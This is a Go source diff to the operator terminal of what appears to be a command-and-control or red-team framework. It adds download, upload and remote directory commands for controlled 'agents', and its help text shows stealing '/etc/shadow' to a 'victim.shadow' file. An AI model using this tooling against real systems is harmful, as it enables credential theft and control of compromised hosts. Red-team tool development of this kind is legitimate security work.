@@ -204,7 +204,31 @@ func handleTerminalInput(input string) {
 			terminalCommandHelp(":c")
 		}
 	case ":d", ":down", ":download":
-		terminalCommandDownload()
+		var node *agentInfo
+		// argoffset tracks if the agent was specified, use in inputs[] index offset
+		argoffset := 1
+		ok := false
+
+		if len(inputs) > 1 {
+			node, ok = AgentTrackerGetInfoByFriendly(inputs[1])
+		}
+		if !ok {
+			node, ok = AgentTrackerGetInfoByNodeID(activeNode)
+			argoffset = 0
+		}
+		if !ok {
+			terminalCommandHelp(":d")
+			printError("No active agent and no agent specified in command.")
+		} else {
+			if (len(inputs) - argoffset) == 2 {
+				// No dst filename provided, use same as src
+				terminalCommandDownload(node.Node.ID, inputs[1+argoffset], TerminalSanitizeFilepath(inputs[1+argoffset]))
+			} else if (len(inputs) - argoffset) == 3 {
+				terminalCommandDownload(node.Node.ID, inputs[1+argoffset], inputs[2+argoffset])
+			} else {
+				terminalCommandHelp(":d")
+			}
+		}
 	case ":h", ":history":
 		if len(inputs) == 2 {
 			if inputs[1] == "all" {
@@ -272,27 +296,78 @@ func handleTerminalInput(input string) {
 			terminalCommandHelp(":lpwd")
 		}
 	case ":rcd":
-		//if len(inputs) == 1 {
-		//	terminalCommandRemotePresentWorkingDirectory()
-		//} else if len(inputs) == 2 {
-		//	terminalCommandRemoteChangeDirectory(inputs[1])
-		//} else {
-		//	terminalCommandHelp(":rcd")
-		//}
+		var node *agentInfo
+		// argoffset tracks if the agent was specified, use in inputs[] index offset
+		argoffset := 1
+		ok := false
+
+		if len(inputs) > 1 {
+			node, ok = AgentTrackerGetInfoByFriendly(inputs[1])
+		}
+		if !ok {
+			node, ok = AgentTrackerGetInfoByNodeID(activeNode)
+			argoffset = 0
+		}
+		if !ok {
+			terminalCommandHelp(":rcd")
+			printError("No active agent and no agent specified in command.")
+		} else {
+			if (len(inputs) - argoffset) == 1 {
+				terminalCommandRemotePresentWorkingDirectory(node.Node.ID)
+			} else if (len(inputs) - argoffset) == 2 {
+				terminalCommandRemoteChangeDirectory(node.Node.ID, inputs[1+argoffset])
+			} else {
+				terminalCommandHelp(":rcd")
+			}
+		}
 	case ":rls", ":rdir":
-		//if len(inputs) == 1 {
-		//	terminalCommandRemoteListFiles(".")
-		//} else if len(inputs) == 2 {
-		//	terminalCommandRemoteListFiles(inputs[1])
-		//} else {
-		//	terminalCommandHelp(":rls")
-		//}
+		var node *agentInfo
+		// argoffset tracks if the agent was specified, use in inputs[] index offset
+		argoffset := 1
+		ok := false
+
+		if len(inputs) > 1 {
+			node, ok = AgentTrackerGetInfoByFriendly(inputs[1])
+		}
+		if !ok {
+			node, ok = AgentTrackerGetInfoByNodeID(activeNode)
+			argoffset = 0
+		}
+		if !ok {
+			terminalCommandHelp(":rls")
+			printError("No active agent and no agent specified in command.")
+		} else {
+			if (len(inputs) - argoffset) == 1 {
+				terminalCommandRemoteListFiles(node.Node.ID, ".")
+			} else if (len(inputs) - argoffset) == 2 {
+				terminalCommandRemoteListFiles(node.Node.ID, inputs[1+argoffset])
+			} else {
+				terminalCommandHelp(":rls")
+			}
+		}
 	case ":rpwd":
-		//if len(inputs) == 1 {
-		//	terminalCommandRemotePresentWorkingDirectory()
-		//} else {
-		//	terminalCommandHelp(":rpwd")
-		//}
+		var node *agentInfo
+		// argoffset tracks if the agent was specified, use in inputs[] index offset
+		argoffset := 1
+		ok := false
+
+		if len(inputs) > 1 {
+			node, ok = AgentTrackerGetInfoByFriendly(inputs[1])
+		}
+		if !ok {
+			node, ok = AgentTrackerGetInfoByNodeID(activeNode)
+			argoffset = 0
+		}
+		if !ok {
+			terminalCommandHelp(":rcd")
+			printError("No active agent and no agent specified in command.")
+		} else {
+			if (len(inputs) - argoffset) == 1 {
+				terminalCommandRemotePresentWorkingDirectory(node.Node.ID)
+			} else {
+				terminalCommandHelp(":rpwd")
+			}
+		}
 	case ":s", ":set", ":setting", ":settings":
 		if len(inputs) == 1 {
 			terminalCommandSet("", "")
@@ -312,8 +387,31 @@ func handleTerminalInput(input string) {
 			terminalCommandHelp(":t")
 		}
 	case ":u", ":up", ":upload":
+		var node *agentInfo
+		// argoffset tracks if the agent was specified, use in inputs[] index offset
+		argoffset := 1
+		ok := false
 
-		terminalCommandUpload()
+		if len(inputs) > 1 {
+			node, ok = AgentTrackerGetInfoByFriendly(inputs[1])
+		}
+		if !ok {
+			node, ok = AgentTrackerGetInfoByNodeID(activeNode)
+			argoffset = 0
+		}
+		if !ok {
+			terminalCommandHelp(":u")
+			printError("No active agent and no agent specified in command.")
+		} else {
+			if (len(inputs) - argoffset) == 2 {
+				// No dst filename provided, use same as src
+				terminalCommandUpload(node.Node.ID, inputs[1+argoffset], TerminalSanitizeFilepath(inputs[1+argoffset]))
+			} else if (len(inputs) - argoffset) == 3 {
+				terminalCommandUpload(node.Node.ID, inputs[1+argoffset], inputs[2+argoffset])
+			} else {
+				terminalCommandHelp(":u")
+			}
+		}
 	case ":q", ":quit":
 		terminalCommandQuit(nil, "")
 	case "::":
@@ -434,19 +532,17 @@ func terminalCommandHelp(topic string) {
 	case ":d", ":down", ":download":
 		fmt.Println("--> COMMAND HELP FOR: :d, :down, :download")
 		fmt.Println()
-		fmt.Println("TODO: Write this section when command is functional.")
-		fmt.Println()
 		fmt.Println("USAGE: ")
 		fmt.Println("\t:d <remote_src_file>                           -  Downloads the remote source file from the active agent to the local directory.")
-		fmt.Println("\t:d /etc/shadow                                 -  Downloads '/etc/shadow' from the active agent to './shadow' locally.")
+		fmt.Println("\t:d /etc/shadow                                 -  Downloads '/etc/shadow' from the active agent to './-etc-shadow' locally.")
 		fmt.Println("\t:d <remote_src_file> <local_dst_file>          -  Downloads the remote source file from the active agent to the specific local location.")
-		fmt.Println("\t:d /etc/shadow /tmp/victim.shadow              -  Downloads 'etc/shadow' from the active agent to '/tmp/victim.shadow' locally.")
+		fmt.Println("\t:d /etc/shadow /tmp/victim.shadow              -  Downloads '/etc/shadow' from the active agent to '/tmp/victim.shadow' locally.")
 		fmt.Println("\t:d <agent> <remote_src_file>                   -  Downloads the remote source file from the specified agent to the local directory.")
-		fmt.Println("\t:d agent002 /etc/shadow                        -  Downloads 'etc/shadow' from agent002 to the local directory.")
+		fmt.Println("\t:d agent002 /etc/shadow                        -  Downloads '/etc/shadow' from agent002 to './-etc-shadow' locally.")
 		fmt.Println("\t:d <agent> <remote_src_file> <local_dst_file>  -  Downloads the remote source file from the specified agent to the specified local location.")
 		fmt.Println()
 		fmt.Println("DESCRIPTION:")
-		fmt.Println("\t<<<>>>")
+		fmt.Println("\tUse `:d` to download files from an agent node to the local terminal node.")
 		fmt.Println()
 		fmt.Println(ANSIColorize("NOTE: If multiple security researchers are using the constellation, best practice is to explicitly specify the full file path for the remote file.", ANSIColor_Error))
 	case ":h", ":history":
@@ -497,11 +593,65 @@ func terminalCommandHelp(topic string) {
 		fmt.Println("DESCRIPTION:")
 		fmt.Println("\tUse `:l` to list agents, connections, listeners, shells, streams, etc. Also shows how long it has been since an agent has synced.")
 	case ":lcd":
+		fmt.Println("--> COMMAND HELP FOR: :lcd")
+		fmt.Println()
+		fmt.Println("TODO: Write this section when command is functional.")
+		fmt.Println()
+		fmt.Println("USAGE: ")
+		fmt.Println()
+		fmt.Println("DESCRIPTION:")
+		fmt.Println("\t<<<>>>")
+		fmt.Println()
 	case ":lls", ":ldir":
+		fmt.Println("--> COMMAND HELP FOR: :lls, :ldir")
+		fmt.Println()
+		fmt.Println("TODO: Write this section when command is functional.")
+		fmt.Println()
+		fmt.Println("USAGE: ")
+		fmt.Println()
+		fmt.Println("DESCRIPTION:")
+		fmt.Println("\t<<<>>>")
+		fmt.Println()
 	case ":lpwd":
+		fmt.Println("--> COMMAND HELP FOR: :lpwd")
+		fmt.Println()
+		fmt.Println("TODO: Write this section when command is functional.")
+		fmt.Println()
+		fmt.Println("USAGE: ")
+		fmt.Println()
+		fmt.Println("DESCRIPTION:")
+		fmt.Println("\t<<<>>>")
+		fmt.Println()
 	case ":rcd":
+		fmt.Println("--> COMMAND HELP FOR: :rcd")
+		fmt.Println()
+		fmt.Println("TODO: Write this section when command is functional.")
+		fmt.Println()
+		fmt.Println("USAGE: ")
+		fmt.Println()
+		fmt.Println("DESCRIPTION:")
+		fmt.Println("\t<<<>>>")
+		fmt.Println()
 	case ":rls", ":rdir":
+		fmt.Println("--> COMMAND HELP FOR: :rls, :rdir")
+		fmt.Println()
+		fmt.Println("TODO: Write this section when command is functional.")
+		fmt.Println()
+		fmt.Println("USAGE: ")
+		fmt.Println()
+		fmt.Println("DESCRIPTION:")
+		fmt.Println("\t<<<>>>")
+		fmt.Println()
 	case ":rpwd":
+		fmt.Println("--> COMMAND HELP FOR: :rpwd")
+		fmt.Println()
+		fmt.Println("TODO: Write this section when command is functional.")
+		fmt.Println()
+		fmt.Println("USAGE: ")
+		fmt.Println()
+		fmt.Println("DESCRIPTION:")
+		fmt.Println("\t<<<>>>")
+		fmt.Println()
 	case ":s", ":set", ":setting", ":settings":
 		fmt.Println("--> COMMAND HELP FOR: :s, :set, :setting, :settings")
 		fmt.Println()
@@ -806,11 +956,6 @@ func terminalCommandShellConnect(node star.NodeID, address string) {
 	}
 }
 
-func terminalCommandDownload() (err error) {
-	printError("Download is not yet implemented!")
-	return
-}
-
 func terminalCommandHistory(all bool, node star.NodeID, stream star.StreamID) (err error) {
 	historyItemsMutex.Lock()
 	defer historyItemsMutex.Unlock()
@@ -1052,7 +1197,7 @@ func terminalCommandLocalChangeDirectory(directory string) (err error) {
 	os.Chdir(directory)
 	newdirectory, _ := os.Getwd()
 
-	fmt.Println("Change terminal working directory from [", olddirectory, "] to [", newdirectory, "]")
+	fmt.Println("Changed terminal working directory from [", olddirectory, "] to [", newdirectory, "]")
 
 	return
 }
@@ -1088,14 +1233,26 @@ func terminalCommandLocalPresentWorkingDirectory() (err error) {
 }
 
 func terminalCommandRemoteChangeDirectory(node star.NodeID, directory string) (err error) {
+	msg := star.NewMessageTypeRemoteCDRequest(directory)
+	msg.Destination = node
+	msg.Send(star.ConnectID{})
+
 	return
 }
 
 func terminalCommandRemoteListFiles(node star.NodeID, directory string) (err error) {
+	msg := star.NewMessageTypeRemoteLSRequest(directory)
+	msg.Destination = node
+	msg.Send(star.ConnectID{})
+
 	return
 }
 
 func terminalCommandRemotePresentWorkingDirectory(node star.NodeID) (err error) {
+	msg := star.NewMessageTypeRemotePWDRequest()
+	msg.Destination = node
+	msg.Send(star.ConnectID{})
+
 	return
 }
 
@@ -1199,8 +1356,49 @@ func terminalCommandTerminate(context string) (err error) {
 	return
 }
 
-func terminalCommandUpload() (err error) {
-	printError("Upload is not yet implemented!")
+func terminalCommandDownload(node star.NodeID, src string, dst string) (err error) {
+	// Open the file
+	f, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0700)
+	if err != nil {
+		printError(fmt.Sprintf("Error attempting to open local file %s to download: %v", src, err))
+		return
+	}
+
+	// Download stream!
+	star.NewStreamMetaDownload(node, src, func(data []byte) {
+		f.Write(data)
+	}, func(s star.StreamID) {
+		f.Close()
+	})
+	return
+}
+
+func terminalCommandUpload(node star.NodeID, src string, dst string) (err error) {
+	go func() {
+		// Open the file
+		f, err := os.Open(src)
+		if err != nil {
+			printError(fmt.Sprintf("Error attempting to open local file %s to upload: %v", src, err))
+			return
+		}
+		defer f.Close()
+
+		// Upload stream!
+		meta := star.NewStreamMetaUpload(node, dst, func(data []byte) {}, func(s star.StreamID) {})
+		r := bufio.NewReader(f)
+		for {
+			buff := make([]byte, star.RandDataSize())
+			n, err := r.Read(buff)
+			if err == nil && n > 0 {
+				meta.Write(buff[:n])
+			} else {
+				break
+			}
+		}
+
+		meta.Close()
+	}()
+
 	return
 }
 
@@ -1271,6 +1469,12 @@ func TerminalProcessMessage(msg *star.Message) {
 		TerminalProcessMessageNewConnection(msg)
 	case star.MessageTypeHello:
 		TerminalProcessMessageHello(msg)
+	case star.MessageTypeRemoteCDResponse:
+		TerminalProcessMessageRemoteCDResponse(msg)
+	case star.MessageTypeRemoteLSResponse:
+		TerminalProcessMessageRemoteLSResponse(msg)
+	case star.MessageTypeRemotePWDResponse:
+		TerminalProcessMessageRemotePWDResponse(msg)
 	}
 }
 
@@ -1299,6 +1503,14 @@ func TerminalProcessMessageError(msg *star.Message) {
 			printNotice(fmt.Sprintf("%s has reported that a command has terminated. Context: %s", FriendlyAgentName(msg.Source, star.StreamID{}), errMsg.Context))
 		case star.MessageErrorResponseTypeShellConnectionLost:
 			printNotice(fmt.Sprintf("%s has reported that a shell connection was dropped. Context: %s", FriendlyAgentName(msg.Source, star.StreamID{}), errMsg.Context))
+		case star.MessageErrorResponseTypeFileDownloadOpenFileError:
+			printError(fmt.Sprintf("%s has reported an error when attempting to open a file for downloading to the terminal. Context: %s", FriendlyAgentName(msg.Source, star.StreamID{}), errMsg.Context))
+		case star.MessageErrorResponseTypeFileUploadOpenFileError:
+			printError(fmt.Sprintf("%s has reported an error when attempting to open/create a file for uploading from the terminal. Context: %s", FriendlyAgentName(msg.Source, star.StreamID{}), errMsg.Context))
+		case star.MessageErrorResponseTypeFileDownloadCompleted:
+			printNotice(fmt.Sprintf("%s has reported that %s has completed downloading.", FriendlyAgentName(msg.Source, star.StreamID{}), errMsg.Context))
+		case star.MessageErrorResponseTypeFileUploadCompleted:
+			printNotice(fmt.Sprintf("%s has reported that %s has completed uploading.", FriendlyAgentName(msg.Source, star.StreamID{}), errMsg.Context))
 		default:
 			printError(fmt.Sprintf("%s has reported: %s", FriendlyAgentName(msg.Source, star.StreamID{}), errMsg.Context))
 		}
@@ -1359,6 +1571,52 @@ func TerminalProcessMessageHello(msg *star.Message) {
 	err := msg.GobDecodeMessage(&resMsg)
 	if err == nil {
 		AgentTrackerUpdateInfo(&resMsg.Node, &resMsg.Info)
+	}
+}
+
+func TerminalProcessMessageRemoteCDResponse(msg *star.Message) {
+	var resMsg star.MessageRemoteCDResponse
+
+	err := msg.GobDecodeMessage(&resMsg)
+	if err == nil {
+		printInfo(fmt.Sprintf("%s reports that it has changed its working directory from [%s] to [%s], per %s.", FriendlyAgentName(msg.Source, star.StreamID{}), resMsg.OldDirectory, resMsg.NewDirectory, FriendlyAgentName(resMsg.Requester, star.StreamID{})))
+	}
+}
+
+func TerminalProcessMessageRemoteLSResponse(msg *star.Message) {
+	var resMsg star.MessageRemoteLSResponse
+
+	err := msg.GobDecodeMessage(&resMsg)
+	if err == nil {
+		printInfo(fmt.Sprintf("%s reports the following file/directory information for [%s]:", FriendlyAgentName(msg.Source, star.StreamID{}), resMsg.Directory))
+		w := tabwriter.NewWriter(os.Stdout, 0, 0, 1, ' ', 0)
+
+		// Directories first
+		for _, f := range resMsg.Files {
+			if f.IsDir {
+				fmt.Fprintln(w, "["+f.Name+"]", "\t", f.ModTime.Format(terminalSettings["display.timestamp"].Data.(string)), "\t", f.Mode, "\t", f.Size)
+			}
+		}
+
+		// Files second
+		for _, f := range resMsg.Files {
+			if !f.IsDir {
+				fmt.Fprintln(w, f.Name, "\t", f.ModTime.Format(terminalSettings["display.timestamp"].Data.(string)), "\t", f.Mode, "\t", f.Size)
+			}
+		}
+
+		w.Flush()
+	} else {
+		fmt.Printf("%v+", err)
+	}
+}
+
+func TerminalProcessMessageRemotePWDResponse(msg *star.Message) {
+	var resMsg star.MessageRemotePWDResponse
+
+	err := msg.GobDecodeMessage(&resMsg)
+	if err == nil {
+		printInfo(fmt.Sprintf("%s reports that its PWD=[%s]", FriendlyAgentName(msg.Source, star.StreamID{}), resMsg.Directory))
 	}
 }
 
@@ -1550,3 +1808,11 @@ func AgentTrackerGetInfoByNodeID(id star.NodeID) (ai *agentInfo, ok bool) {
 
 ///////////////////////////////////////////////////////////////////////////////
 ///////////////////////////////////////////////////////////////////////////////
+
+func TerminalSanitizeFilepath(fp string) (res string) {
+	res = fp
+	for _, s := range []string{"/", "\\"} {
+		res = strings.Replace(res, s, "-", -1)
+	}
+	return
+}
